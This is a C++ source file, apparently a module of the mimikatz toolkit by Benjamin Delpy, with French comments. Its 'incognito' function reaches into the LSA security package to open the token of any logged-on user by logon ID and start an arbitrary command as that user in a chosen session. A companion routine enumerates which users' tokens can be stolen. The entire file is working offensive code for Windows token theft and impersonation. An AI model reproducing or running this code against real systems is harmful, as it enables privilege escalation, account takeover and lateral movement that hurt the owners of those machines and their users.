/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "incognito.h"

bool searchIncognitoFuncs()
{
	return searchLSAFuncs();
}

__kextdll bool __cdecl find_tokens(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	vector<pair<PFN_ENUM_BY_LUID, wstring>> monProvider;
	monProvider.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getTokenData, wstring(L"token")));
	return getLogonData(monPipe, mesArguments, &monProvider);
}

__kextdll bool __cdecl incognito(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	wostringstream monStream;
	if(searchIncognitoFuncs())
	{
		if(!mesArguments->empty() && ((mesArguments->size() == 3) || (mesArguments->size() == 4)))
		{
			wstring idSecAppHigh = L"0", idSecAppLow = mesArguments->front(), session = mesArguments->at(1), maLigne = mesArguments->back();
			if(mesArguments->size() == 4)
			{
				idSecAppHigh = idSecAppLow;
				idSecAppLow = mesArguments->at(1);
				session = mesArguments->at(2);
			}
			LUID monLUID = mod_text::wstringsToLUID(idSecAppHigh, idSecAppLow);
			DWORD maSession = _wtoi(session.c_str());
			HANDLE monToken;
			monStream << L" * OpenTokenByLogonId({" << monLUID.LowPart << L";" << monLUID.HighPart << L"}) : ";
			NTSTATUS status = SeckPkgFunctionTable->OpenTokenByLogonId(&monLUID, &monToken);
			if(NT_SUCCESS(status))
			{
				monStream << L"OK !" << endl <<
					L" * SetTokenInformation(TokenSessionId@" << maSession << L") : ";
				if(SetTokenInformation(monToken, TokenSessionId, &maSession, sizeof(DWORD)) != 0)
				{
					monStream << L"OK !" << endl <<
						L" * CreateProcessAsUser(Token@{" << monLUID.LowPart << L";" << monLUID.HighPart << L"}, TokenSessionId@" << maSession << L", \"" << maLigne << L"\") : ";
					PROCESS_INFORMATION mesInfosProcess;
					if(mod_process::start(&maLigne, &mesInfosProcess, false, false, monToken))
					{
						monStream << L"OK - pid = " << mesInfosProcess.dwProcessId << endl;
						CloseHandle(mesInfosProcess.hThread);
						CloseHandle(mesInfosProcess.hProcess);
					}
					else monStream << L"KO - " << mod_system::getWinError() << endl;
					CloseHandle(monToken);
				}
				else monStream << L"KO - " << mod_system::getWinError() << endl;
			}
			else monStream << L"KO - " << mod_system::getWinError(false, status) << endl;
		}
		else monStream << L"Format d\'appel invalide : incognito [idSecAppHigh] idSecAppLow sessionDst ligneDeCommande" << endl;		
	}
	return sendTo(monPipe, monStream.str());
}

bool WINAPI getTokenData(__in PLUID logId, __in mod_pipe * monPipe, __in bool justSecurity)
{
	wostringstream monStream;
	if(searchIncognitoFuncs())
	{
		HANDLE monToken;
		NTSTATUS status = SeckPkgFunctionTable->OpenTokenByLogonId(logId, &monToken);
		if(NT_SUCCESS(status))
		{
			monStream << L"Disponible !";
			DWORD maSession, tailleRetournee;
			if(GetTokenInformation(monToken, TokenSessionId, &maSession, sizeof(DWORD), &tailleRetournee) != 0)
			{
				monStream << L" - session d\'origine " << maSession;
				CloseHandle(monToken);
			}
			else monStream << L"Indisponible - SetTokenInformation KO : " << mod_system::getWinError() << endl;
		}
		else monStream << L"OpenTokenByLogonId KO : " << mod_system::getWinError(false, status) << endl;
	}
	return sendTo(monPipe, monStream.str());
}